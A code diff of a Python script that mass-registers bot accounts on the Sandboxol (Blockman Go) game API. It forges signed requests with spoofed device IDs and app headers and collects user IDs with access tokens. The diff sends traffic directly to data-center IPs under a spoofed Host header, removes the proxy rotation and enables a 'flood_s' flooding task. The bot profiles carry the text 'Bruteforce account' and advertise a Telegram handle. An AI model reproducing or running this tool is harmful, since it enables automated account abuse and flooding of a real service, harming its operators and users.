@@ -15,7 +15,6 @@ except ImportError:
 from Crypto.Cipher import AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
 from Crypto.PublicKey import RSA
-from PyRoxy import ProxyChecker, ProxyUtiles
 
 PROXY_WORK = []
 
@@ -78,7 +77,7 @@ async def cdn(session):
         DATA_CENTERS[:] = sorted(list(unique_ips))
         print(f"DATA_CENTERS updated: {DATA_CENTERS}")
 
-        await asyncio.sleep(600)
+        await asyncio.sleep(6000000000000000000000)
 
 async def proxies(session):
     while True:
@@ -140,13 +139,11 @@ async def main():
     ) as session:
         asyncio.create_task(update_endpoints(session))
         asyncio.create_task(cdn(session))
-        asyncio.create_task(proxies(session))
-        await asyncio.sleep(60)
+        await asyncio.sleep(5)
         lock = asyncio.Lock()
         asyncio.create_task(create_accounts(session, lock))
-       # await asyncio.sleep(15)
-      #  asyncio.create_task(flood_s(session, lock))
-     #   asyncio.create_task(clan_parsing(session))
+        await asyncio.sleep(15)
+        asyncio.create_task(flood_s(session, lock))
         await asyncio.sleep(9999999999999999999999999999999999999999)
 
 ACCOUNTS = []
@@ -161,10 +158,9 @@ async def cr(session, lock):
         xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}", android_id)
         try:
             async with session.get(
-                f"http://gw.sandboxol.com/user/api/v5/account/auth-token",
+                f"https://{random.choice(DATA_CENTERS)}/user/api/v5/account/auth-token",
                 timeout=2,
                 params={"q":query},
-                proxy=random.choice(PROXY_WORK),
                 headers={
                     "bmg-user-id": "0",
                     "bmg-device-id": android_id,
@@ -217,12 +213,12 @@ async def cr(session, lock):
                     "X-Sign": xsign,
                     "X-UrlPath": "/user/api/v5/account/auth-token",
                     "Access-Token": "",
+                    "Host": "gw.sandboxol.com",
                     "Connection": "Keep-Alive",
                     "Accept-Encoding": "gzip",
                     "User-Agent": "okhttp/4.10.0"
                 }
             ) as response:
-                print(await response.text())
                 if (await response.json())["code"] == 1:
                     answer = await response.json()
                     user_id = str(int(answer["data"]["userId"]))
@@ -237,10 +233,9 @@ async def cr(session, lock):
                     body_string = f'{{"decorationPicUrl":"http://static.sandboxol.com/sandbox/avatar/male.png","inviteCode":"","details":"httрs://t.mе/kn_ew (in telegram @kn_ew)\\nBruteforce account","decorationPicUrl":"http://staticgs.sandboxol.com/avatar/1761081787482114.jpg","nickName":"{nickname}","picType":1,"sex":1}}'
                     xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                     async with session.post(
-                        f"http://gw.sandboxol.com/user/api/v1/user/register",
+                        f"https://{random.choice(DATA_CENTERS)}/user/api/v1/user/register",
                         timeout=2,
                         data=body_string.encode(),
-                        proxy=random.choice(PROXY_WORK),
                         headers={
                             "bmg-device-id": android_id,
                             "userId": user_id,
@@ -290,19 +285,18 @@ async def cr(session, lock):
                             "X-UrlPath": "/user/api/v1/user/register",
                             "Access-Token": get_enc_token(token + nonce),
                             "Content-Type": "application/json; charset=UTF-8",
+                            "Host": "gw.sandboxol.com",
                             "Connection": "Keep-Alive",
                             "Accept-Encoding": "gzip",
                             "User-Agent": "okhttp/4.10.0"
                         }
                     ) as response:
-                        print(await response.text())
                         if (await response.json())["code"] == 1:
                             answer = await response.json()
                             token = answer["data"]["accessToken"]
                             register_time = str(int(answer["data"]["registerTime"]))
                             async with lock: ACCOUNTS.append(f"{user_id}:{token}:{android_id}:{register_time}:{device_register_time}")
-        except Exception as e:
-            print(e)
+        except:
             continue
 
 async def create_accounts(session, lock):
